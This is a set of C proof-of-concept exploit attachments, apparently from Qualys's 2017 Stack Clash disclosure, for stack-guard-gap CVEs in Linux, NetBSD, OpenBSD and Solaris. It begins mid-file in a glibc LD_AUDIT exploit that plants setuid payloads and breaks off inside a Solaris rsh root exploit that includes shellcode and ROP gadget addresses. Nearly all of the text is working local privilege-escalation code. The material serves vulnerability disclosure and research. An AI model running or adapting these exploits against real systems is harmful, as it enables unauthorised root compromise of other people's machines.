    for (i = 0; i < MAX_RLDAS; i++) {
        cp = mempcpy(cp, REL_LA ":", sizeof(REL_LA));
    }
    if (cp >= lda + sizeof(lda)) die();
    if (*cp) die();
  }
    static char rlda[MAX_ARG_STRLEN];

    const size_t args = 1 + pads + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    size_t i;
    for (i = 0; i < pads; i++) {
        *ap++ = pad;
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 2 + ldas + 2;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    size_t i;
    for (i = 0; i < ldas; i++) {
        *ep++ = lda;
    }
    *ep++ = rlda;
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    static const struct rlimit rlimit_stack = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }
    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

  {
    #define ABS_LA_DIR "/" LIB "/" LIB_TO_TMP "/"
    static const char * const abs_las[] = {
        ABS_LA_DIR "" REL_LA,
        ABS_LA_DIR "/" REL_LA,
        ABS_LA_DIR "/." REL_LA,
        ABS_LA_DIR "/.." REL_LA,
    };
    size_t i;
    for (i = 0; i < sizeof(abs_las)/sizeof(*abs_las); i++) {
        const int fd = open(abs_las[i], O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
        if (fd <= -1) die();
      {
        struct stat st;
        if (fstat(fd, &st)) die();
        if (!S_ISREG(st.st_mode)) die();
        if (st.st_uid != getuid()) die();
        if (st.st_uid != geteuid()) die();
      }
      {
        static const
        #include "la.so.h"
        if (sizeof(la_so) != la_so_len) die();
        if (write(fd, la_so, sizeof(la_so)) != (ssize_t)sizeof(la_so)) die();
      }
        if (fchmod(fd, 04755)) die();
        if (close(fd)) die();
    }
  }

    size_t try;
    for (try = 1; try <= 65536; try++) {
      {
        char * cp = mempcpy(rlda, LDA, sizeof(LDA)-1);
        size_t rldas = 1 + random() % (65536 / sizeof(struct audit_list));
        if (rldas > MAX_RLDAS) die();
        if (rldas <= 0) die();
        while (rldas--) {
            cp = mempcpy(cp, REL_LA ":", sizeof(REL_LA));
        }
        if (cp >= rlda + sizeof(rlda)) die();
        *cp = '\0';
      }
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
            die();
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Linux_offset2lib.c"

/*
 * Linux_offset2lib.c for CVE-2017-1000370 and CVE-2017-1000371
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

#define MAX_STACK_SIZE ((size_t)1<<30)
#define MAX_ARG_STRLEN ((size_t)128<<10)
#define MIN_ARGC 1024

static void
analyze_mappings(const char * const binary)
{
    if (!binary) die();
    if (strchr(binary, ' ')) die();
    int rval = EXIT_FAILURE;
    int dump = 0;

    const int fd = open("/proc/self/maps", O_RDONLY);
    if (fd <= -1) die();

    static char buf[4096] = " ";
    char * cp = buf;
    for (;;) {
        if (cp >= buf + sizeof(buf)) die();
        const ssize_t nr = read(fd, cp, buf + sizeof(buf) - cp);
        if (nr <= 0) {
            if (nr == 0) break;
            if (nr != -1) die();
            if (errno != EAGAIN && errno != EINTR) die();
            continue;
        }
        cp += nr;
    }
    *cp = '\0';
    if (memchr(buf, '\0', sizeof(buf)) != cp) die();

    size_t hi_bin = 0;
    size_t lo_lib = 0;
    size_t lo_heap = 0;
    size_t lo_stack = 0;
    const char * line = buf;
    for (;;) {
        char * const nl = strchr(line, '\n');
        if (!nl) die();
        *nl = '\0';

        cp = NULL;
        const size_t lo = strtoul(line, &cp, 16);
        if (cp <= line || *cp != '-') die();
        if (lo <= 0) die();

        line = cp + 1;
        cp = NULL;
        const size_t hi = strtoul(line, &cp, 16);
        if (cp <= line || *cp != ' ') die();
        if (hi <= lo) die();

        cp = strrchr(cp + 1, ' ');
        if (!cp) die();
        cp++;

        if (!strcmp(cp, binary)) {
            hi_bin = hi;
            if (lo == 0x08048000) {
                fprintf(stderr, "Please recompile with -fpie -pie\n");
                die();
            }
        } else if (!strcmp(cp, "[heap]")) {
            if (!lo_heap) lo_heap = lo;
            else {
                if (lo_stack) die();
                lo_stack = lo;
                dump = 1;
            }
        } else if (!strcmp(cp, "[stack]")) {
            if (!lo_stack) lo_stack = lo;
            else {
                die();
            }
        } else if (*cp == '/') {
            if (!lo_lib) lo_lib = lo;
        }

        *nl = '\n';
        line = nl + 1;
        if (*line == '\0') break;
    }
    if (!hi_bin) die();
    if (!lo_lib) die();
    if (!lo_stack) {
        if (!lo_heap) die();
        lo_stack = lo_heap;
        lo_heap = 0;
    }

    if (hi_bin <= lo_lib && lo_lib - hi_bin <= 4096) {
        fprintf(stderr, "CVE-2017-1000370 triggered\n");
        rval = EXIT_SUCCESS;
        dump = 1;
    }
    if (hi_bin <= lo_stack && lo_stack - hi_bin <= 4096) {
        fprintf(stderr, "CVE-2017-1000371 triggered\n");
        rval = EXIT_SUCCESS;
        dump = 1;
    }
    if (dump) {
        const ssize_t len = strlen(buf);
        if (len <= 0) die();
        if (write(STDERR_FILENO, buf, len) != len) die();
    }
    if (close(fd)) die();
    exit(rval);
}

int
main(const int my_argc, const char * const my_argv[])
{
    if (my_argc >= MIN_ARGC) {
        analyze_mappings(*my_argv);
        die();
    }

    size_t stack_size = MAX_STACK_SIZE;
    if (my_argc == 2) stack_size = strtoul(my_argv[1], NULL, 0);
    else if (my_argc != 1) die();
    if (stack_size > MAX_STACK_SIZE) die();

    static char arg[MAX_ARG_STRLEN] = " ";
    memset(arg, ' ', sizeof(arg)-1);

    const size_t argc = 1 + stack_size / (sizeof(arg) + sizeof(char *));
    if (argc < MIN_ARGC) die();

    char ** const argv = calloc(argc + 1, sizeof(char *));
    if (!argv) die();

    char * const binary = realpath(*my_argv, NULL);
    if (!binary) die();
    *argv = binary;

    size_t i;
    for (i = 1; i < argc; i++) argv[i] = arg;
    if (i != argc) die();
    if (argv[i]) die();

    for (i = 1; i; i++) {
        fprintf(stderr, "Run #%zu...\n", i);
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            static const struct rlimit stack_limit = { RLIM_INFINITY, RLIM_INFINITY };
            if (setrlimit(RLIMIT_STACK, &stack_limit)) die();
            execve(*argv, argv, NULL);
            die();
        }
        int status = 0;
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (!WIFEXITED(status)) die();
        if (WEXITSTATUS(status) == EXIT_SUCCESS) continue;
        if (WEXITSTATUS(status) != EXIT_FAILURE) die();
    }
    die();
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="NetBSD_CVE-2017-1000375.c"

/*
 * NetBSD_CVE-2017-1000375.c (please compile with -O0)
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/time.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static void
smash_no_jump(const size_t smash_size)
{
    char buf[1024];
    memset(buf, 'A', sizeof(buf));
    if (smash_size > sizeof(buf))
        smash_no_jump(smash_size - sizeof(buf));
}

int
main(const int argc, const char * const argv[])
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    if (argc != 2) die();
    const size_t smash_size = strtoul(argv[1], NULL, 0);
    if (smash_size <= 0 || smash_size >= SSIZE_MAX) die();
    smash_no_jump(smash_size);
    exit(EXIT_SUCCESS);
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="OpenBSD_at.c"

/*
 * OpenBSD_at.c for CVE-2017-1000373
 * Copyright (c) 2017  Qualys, Inc.
 * slowsort() adapted from lib/libc/stdlib/qsort.c:
 *
 * Copyright (c) 1992, 1993
 *      The Regents of the University of California.  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the University nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 *  OpenBSD_at.c for CVE-2017-1000372
 *  Copyright (C) 2017  Qualys, Inc.
 *  ttime() adapted from usr.bin/at/at.c:
 *
 *  at.c : Put file into atrun queue
 *  Copyright (C) 1993, 1994  Thomas Koenig
 *
 *  Atrun & Atq modifications
 *  Copyright (C) 1993  David Parsons
 *
 *  Traditional BSD behavior and other significant modifications
 *  Copyright (C) 2002-2003  Todd C. Miller
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. The name of the author(s) may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <ctype.h>
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static const char *
u64tostr(uint64_t u64)
{
    static char str[64];
    char * cp = str + sizeof(str);
    *--cp = '\0';
    do {
        if (cp <= str) _exit(__LINE__);
        *--cp = '0' + (u64 % 10);
    } while (u64 /= 10);
    return cp;
}

#define die() do { \
    const char * const str = u64tostr(__LINE__); \
    const size_t len = strlen(str); \
    write(STDERR_FILENO, "\n[", 2); \
    write(STDERR_FILENO, str, len); \
    write(STDERR_FILENO, "]\n", 2); \
    _exit(EXIT_FAILURE); \
} while (0)

static __inline char    *med3(char *, char *, char *, int (*)(const void *, const void *));
static __inline void     swapfunc(char *, char *, size_t, int);

/*
 * Qsort routine from Bentley & McIlroy's "Engineering a Sort Function".
 */
#define swapcode(TYPE, parmi, parmj, n) {               \
        size_t i = (n) / sizeof (TYPE);                 \
        TYPE *pi = (TYPE *) (parmi);                    \
        TYPE *pj = (TYPE *) (parmj);                    \
        do {                                            \
                TYPE    t = *pi;                        \
                *pi++ = *pj;                            \
                *pj++ = t;                              \
        } while (--i > 0);                              \
}

#define SWAPINIT(a, es) swaptype = ((char *)a - (char *)0) % sizeof(long) || \
        es % sizeof(long) ? 2 : es == sizeof(long)? 0 : 1;

static __inline void
swapfunc(char *a, char *b, size_t n, int swaptype)
{
        if (swaptype <= 1)
                swapcode(long, a, b, n)
        else
                swapcode(char, a, b, n)
}

#define swap(a, b)                                      \
        if (swaptype == 0) {                            \
                long t = *(long *)(a);                  \
                *(long *)(a) = *(long *)(b);            \
                *(long *)(b) = t;                       \
        } else                                          \
                swapfunc(a, b, es, swaptype)

#define vecswap(a, b, n)        if ((n) > 0) swapfunc(a, b, n, swaptype)

static __inline char *
med3(char *a, char *b, char *c, int (*cmp)(const void *, const void *))
{
        return cmp(a, b) < 0 ?
               (cmp(b, c) < 0 ? b : (cmp(a, c) < 0 ? c : a ))
              :(cmp(b, c) > 0 ? b : (cmp(a, c) < 0 ? a : c ));
}

typedef struct {
        size_t idx;
        size_t key;
} slowsort_t;

static __inline void
set_key(void * const _pss, const size_t key)
{
        slowsort_t * const pss = _pss;
        if (!pss) die();
        if (!key) die();
        if (pss->key) die();
        pss->key = key;
}

#define RESET_KEY SIZE_MAX

static void
slowsort(void *aa, size_t n, size_t es, int (*cmp)(const void *, const void *), const size_t stack_size)
{
        if (!aa) die();
        if (n <= 0) die();
        if (n >= SSIZE_MAX) die();
        if (es <= 0) die();
        if (es >= SSIZE_MAX) die();
        if (!cmp) die();

        #define SET_KEYS 4
        #define STACK_FRAME_SIZE 176
        const size_t pathological = stack_size / STACK_FRAME_SIZE * SET_KEYS;
        if (n < pathological) die();
        size_t innocuous = n - pathological;

        char *pa, *pb, *pc, *pd, *pl, *pm, *pn;
        int cmp_result, swaptype;
        size_t d, r;
        char *a = aa;

loop:   SWAPINIT(a, es);
        if (innocuous) {
            if (n <= innocuous) die();
            if (n - innocuous <= SET_KEYS) die();
            if (n <= 40) die();
        }
        if (n < 7) {
                for (pm = a; pm < a + n * es; pm += es) {
                        set_key(pm, 1 + (pm - a) / es);
                }
                for (pm = (char *)a + es; pm < (char *) a + n * es; pm += es)
                        for (pl = pm; pl > (char *) a && cmp(pl - es, pl) > 0;
                             pl -= es)
                                swap(pl, pl - es);
                return;
        }
        pm = (char *)a + (n / 2) * es;
        size_t set_keys = 0;
        if (n > 7) {
                pl = (char *)a;
                pn = (char *)a + (n - 1) * es;
                if (n > 40) {
                        d = (n / 8) * es;
                        if (innocuous) {
                            set_key(pl, RESET_KEY);
                            set_key(pl + d, RESET_KEY);
                            set_key(pl + 2 * d, RESET_KEY);
                        }
                        pl = med3(pl, pl + d, pl + 2 * d, cmp);
                        if (innocuous) set_key(pm - d, RESET_KEY);
                        set_key(pm + 0, n - innocuous - 3);
                        set_key(pm + d, n - innocuous - 2);
                        pm = med3(pm - d, pm, pm + d, cmp);
                        if (innocuous) set_key(pn - 2 * d, RESET_KEY);
                        set_key(pn - d, n - innocuous - 1);
                        set_key(pn - 0, n - innocuous - 0);
                        pn = med3(pn - 2 * d, pn - d, pn, cmp);
                        set_keys = SET_KEYS;
                } else {
                        set_key(pm, n - 1);
                        set_key(pn, n - 0);
                        set_keys = 2;
                }
                pm = med3(pl, pm, pn, cmp);
        } else {
                set_key(pm, n - 0);
                set_keys = 1;
        }
        if (!set_keys) die();
        swap(a, pm);
        if (innocuous) {
            if (a != aa) die();
            slowsort_t * pss = aa;
          {
            const size_t key = pss->key;
            if (!key) die();
            if (n <= 40) die();
            if (set_keys != SET_KEYS) die();
            if (key != n - innocuous - set_keys + 1) die();
          }
            const slowsort_t * const end = pss + n;
            size_t i = 0;
            for (;; pss++) {
                if (pss >= end) {
                    if (i != innocuous) die();
                    break;
                }
                if (!pss->key) {
                    if (i < innocuous) {
                        set_key(pss, n - i++);
                        set_keys++;
                    }
                } else if (pss->key == RESET_KEY) {
                    pss->key = 0;
                } else {
                    if (pss->key > n - innocuous) die();
                }
            }
        }
        pa = pb = (char *)a + es;
        pc = pd = (char *)a + (n - 1) * es;
        for (;;) {
                while (pb <= pc && (cmp_result = cmp(pb, a)) <= 0) {
                        if (cmp_result == 0) {
                                swap(pa, pb);
                                pa += es;
                        }
                        pb += es;
                }
                while (pb <= pc && (cmp_result = cmp(pc, a)) >= 0) {
                        if (cmp_result == 0) {
                                swap(pc, pd);
                                pd -= es;
                        }
                        pc -= es;
                }
                if (pb > pc)
                        break;
                swap(pb, pc);
                pb += es;
                pc -= es;
        }

        pn = (char *)a + n * es;
        r = MIN(pa - (char *)a, pb - pa);
        vecswap(a, pb - r, r);
        r = MIN(pd - pc, pn - pd - (ssize_t)es);
        vecswap(pb, pn - r, r);

        if ((pb - pa) / es != n - set_keys) die();
        if ((pd - pc) / es != set_keys - 1) die();

        if ((r = pb - pa) > es) {
                n = r / es;
                innocuous = 0;
                goto loop;
        }
        die();
}

static int
cmp_key(const void * const a, const void * const b)
{
        const size_t __a_key = ((const slowsort_t *)a)->key;
        const size_t __b_key = ((const slowsort_t *)b)->key;
        const size_t a_key = __a_key != RESET_KEY ? __a_key : 0;
        const size_t b_key = __b_key != RESET_KEY ? __b_key : 0;
        if (a_key < b_key) return -1;
        if (a_key > b_key) return +1;
        return 0;
}

#define    ATOI2(s)    ((s) += 2, ((s)[-2] - '0') * 10 + ((s)[-1] - '0'))

/*
 * Adapted from date(1)
 */
static time_t
ttime(char *arg)
{
    time_t now, then;
    struct tm *lt;
    int yearset;
    char *dot, *p;

    if (time(&now) == (time_t)-1 || (lt = localtime(&now)) == NULL)
        die();

    /* Valid date format is [[CC]YY]MMDDhhmm[.SS] */
    for (p = arg, dot = NULL; *p != '\0'; p++) {
        if (*p == '.' && dot == NULL)
            dot = p;
        else if (!isdigit((unsigned char)*p))
            goto terr;
    }
    if (dot == NULL)
        lt->tm_sec = 0;
    else {
        *dot++ = '\0';
        if (strlen(dot) != 2)
            goto terr;
        lt->tm_sec = ATOI2(dot);
        if (lt->tm_sec > 61)    /* could be leap second */
            goto terr;
    }

    yearset = 0;
    switch(strlen(arg)) {
    case 12:            /* CCYYMMDDhhmm */
        lt->tm_year = ATOI2(arg) * 100;
        lt->tm_year -= 1900;    /* Convert to Unix time */
        yearset = 1;
        /* FALLTHROUGH */
    case 10:            /* YYMMDDhhmm */
        if (yearset) {
            yearset = ATOI2(arg);
            lt->tm_year += yearset;
        } else {
            yearset = ATOI2(arg);
            /* POSIX logic: [00,68]=>20xx, [69,99]=>19xx */
            lt->tm_year = yearset;
            if (yearset < 69)
                lt->tm_year += 100;
        }
        /* FALLTHROUGH */
    case 8:                /* MMDDhhmm */
        lt->tm_mon = ATOI2(arg);
        if (lt->tm_mon > 12 || lt->tm_mon == 0)
            goto terr;
        --lt->tm_mon;        /* Convert from 01-12 to 00-11 */
        lt->tm_mday = ATOI2(arg);
        if (lt->tm_mday > 31 || lt->tm_mday == 0)
            goto terr;
        lt->tm_hour = ATOI2(arg);
        if (lt->tm_hour > 23)
            goto terr;
        lt->tm_min = ATOI2(arg);
        if (lt->tm_min > 59)
            goto terr;
        break;
    default:
        goto terr;
    }

    lt->tm_isdst = -1;        /* mktime will deduce DST. */
    then = mktime(lt);
    if (then == (time_t)-1) {
    terr:
        die();
    }
    if (then < now)
        die();
    return (then);
}

static bool reading_jobs;

void *
reallocarray(void * const ptr, const size_t nmemb, const size_t size)
{
    static void * (* real_reallocarray)(void *ptr, size_t nmemb, size_t size);
    if (!real_reallocarray) {
        real_reallocarray = dlsym(RTLD_NEXT, "reallocarray");
        if (!real_reallocarray) die();
    }
    if (ptr == NULL && nmemb == 2 + 4 && size == sizeof(struct atjob *)) {
        if (reading_jobs) die();
        reading_jobs = true;
    }
    void * const new_ptr = real_reallocarray(ptr, nmemb, size);
    if (!new_ptr) die();
    return new_ptr;
}

#define NUMJOBS (40<<20)

static const size_t *
get_jobkeys(void)
{
    const size_t n = NUMJOBS;
    slowsort_t * const a = calloc(n, sizeof(slowsort_t));
    write(STDERR_FILENO, "initializing jobkeys\n", 21);
    if (!a) die();
    size_t i;
    for (i = 0; i < n; i++) {
        a[i].idx = i;
    }
    slowsort(a, n, sizeof(slowsort_t), cmp_key, 33<<20);
    size_t * const jobkeys = calloc(n, sizeof(*jobkeys));
    write(STDERR_FILENO, "finalizing jobkeys\n", 19);
    if (!jobkeys) die();
    for (i = 0; i < n; i++) {
        const size_t j = a[i].idx;
        const size_t k = a[i].key;
        if (j >= n) die();
        if (k <= 0) die();
        if (k > n) die();
        if (jobkeys[j]) die();
        jobkeys[j] = k;
    }
    free(a);
    return jobkeys;
}

static struct dirent dirent;

struct dirent *
readdir(DIR * const dirp)
{
    static struct dirent * (* real_readdir)(DIR *dirp);
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!real_readdir) die();
    }
    if (!reading_jobs) {
        return real_readdir(dirp);
    }
    static size_t numjobs;
    if (numjobs >= NUMJOBS) {
        write(STDERR_FILENO, "sorting jobs\n", 13);
        return NULL;
    }
    static char arg[32];
    char * cp = arg + sizeof(arg);
    *--cp = '\0';
  {
    static const struct {
        uint32_t min;
        uint32_t max;
    } units[] = {
        { 0, 59 }, /* Second */
        { 0, 59 }, /* Minute */
        { 0, 23 }, /* Hour */
        { 1, 28 }, /* Day */
        { 1, 12 }, /* Month */
        { 2038, 2099 } /* Year */
    };
    static const size_t * jobkeys;
    if (!jobkeys) {
        jobkeys = get_jobkeys();
        if (!jobkeys) die();
        write(STDERR_FILENO, "reading jobs\n", 13);
    }
    uint32_t timer = jobkeys[numjobs++];
    if (timer > NUMJOBS) die();
    if (timer <= 0) die();
    static size_t percent = 10;
    if (numjobs == NUMJOBS / 100 * percent) {
        const char * const str = u64tostr(percent);
        const size_t len = strlen(str);
        write(STDERR_FILENO, str, len);
        write(STDERR_FILENO, "%\n", 2);
        percent += 10;
    }
    size_t i;
    for (i = 0; i < sizeof(units)/sizeof(*units); i++) {
        const uint32_t min = units[i].min;
        const uint32_t max = units[i].max;
        const uint32_t div = max - min + 1;
        const uint32_t u32 = min + timer % div;
        timer /= div;
        if (u32 < min) die();
        if (u32 > max) die();
        const char * const str = u64tostr(u32);
        const size_t len = strlen(str);
        if (cp <= arg) die();
        if (cp - arg < (ssize_t)len) die();
        cp -= len;
        memcpy(cp, str, len);
        if (len < 2) {
            if (cp <= arg) die();
            *--cp = '0';
        }
        if (!i) {
            if (cp <= arg) die();
            *--cp = '.';
        }
    }
    if (timer) die();
  }
    if (strlen(cp) != 15) die();
    const uint64_t timer = ttime(cp);
    strlcpy(dirent.d_name, u64tostr(timer), sizeof(dirent.d_name));
    strlcat(dirent.d_name, ".x", sizeof(dirent.d_name));
    return &dirent;
}

int
fstatat(const int fd, const char * const path, struct stat * const sb, const int flag)
{
    static int (* real_fstatat)(int fd, const char *path, struct stat *sb, int flag);
    if (!real_fstatat) {
        real_fstatat = dlsym(RTLD_NEXT, "fstatat");
        if (!real_fstatat) die();
    }
    if (!reading_jobs || flag != AT_SYMLINK_NOFOLLOW || strcmp(path, dirent.d_name) != 0) {
        return real_fstatat(fd, path, sb, flag);
    }
    memset(sb, 0, sizeof(*sb));
    sb->st_mode = S_IFREG | S_IRUSR | S_IWUSR;
    static uid_t user_uid;
    if (!user_uid) {
        user_uid = getuid();
        if (!user_uid) die();
    }
    sb->st_uid = user_uid;
    return 0;
}

--WIyZ46R2i8wDzkSu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="Solaris_rsh.c"

/*
 * Solaris_rsh.c for CVE-2017-3630, CVE-2017-3629, CVE-2017-3631
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef timersub
#define timersub(a, b, result) \
    do { \
        (result)->tv_sec = (a)->tv_sec - (b)->tv_sec; \
        (result)->tv_usec = (a)->tv_usec - (b)->tv_usec; \
        if ((result)->tv_usec < 0) { \
            --(result)->tv_sec; \
            (result)->tv_usec += 1000000; \
        } \
    } while (0)
#endif

#define RSH "/usr/bin/rsh"
static const struct target * target;
static const struct target {
    const char * name;
    size_t s_first, s_last, s_step;
    size_t l_first, l_last, l_step;
    size_t p_first, p_last, p_step;
    size_t a, b;
    size_t i, j;
} targets[] = {
    {
        .name = "Oracle Solaris 11.1 X86 (Assembled 19 September 2012)",
        .s_first = 16*1024, .s_last = 44*1024, .s_step = 4096,
        .l_first = 192,     .l_last = 512,     .l_step = 16,
        .p_first = 0,       .p_last = 8192,    .p_step = 1,
        .a = 0,             .b = 15,           .j = 12,
        .i = 0x08052608 /* pop edx; pop ebp; ret */
    },
    {
        .name = "Oracle Solaris 11.3 X86 (Assembled 06 October 2015)",
        .s_first = 12*1024, .s_last = 44*1024, .s_step = 4096,
        .l_first = 96,      .l_last = 512,     .l_step = 4,
        .p_first = 0,       .p_last = 4096,    .p_step = 4,
        .a = 0,             .b = 3,            .j = SIZE_MAX,
        .i = 0x07faa7ea /* call *0xc(%ebp) */
    },
};

#define ROOTSHELL "ROOT"
static const char shellcode[] =
    "\x31\xc0\x50\x68ROOT"
    "\x89\xe3\x50\x53\x89\xe2\x50\x50"
    "\x52\x53\xb0\x3C\x48\x50\xcd\x91"
    "\x31\xc0\x40\x50\x50\xcd\x91Z";

static volatile sig_atomic_t sigalarm;

static void
sigalarm_handler(const int signum __attribute__((__unused__)))
{
    sigalarm = 1;
}

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static int
is_suid_root(const char * const file)
{
    if (!file) die();
    static struct stat sbuf;
    if (stat(file, &sbuf)) die();
    if (!S_ISREG(sbuf.st_mode)) die();
    return ((sbuf.st_uid == 0) && (sbuf.st_mode & S_ISUID));
}

static const char *
build_lca(const size_t l)
{
    static const size_t shellcode_len = sizeof(shellcode)-1;
    if (shellcode_len > 64) die();
    if (shellcode_len % 16) die();
    if (l < shellcode_len + target->a + target->b) die();

    #define LCA_MAX 4096
    if (l > LCA_MAX) die();
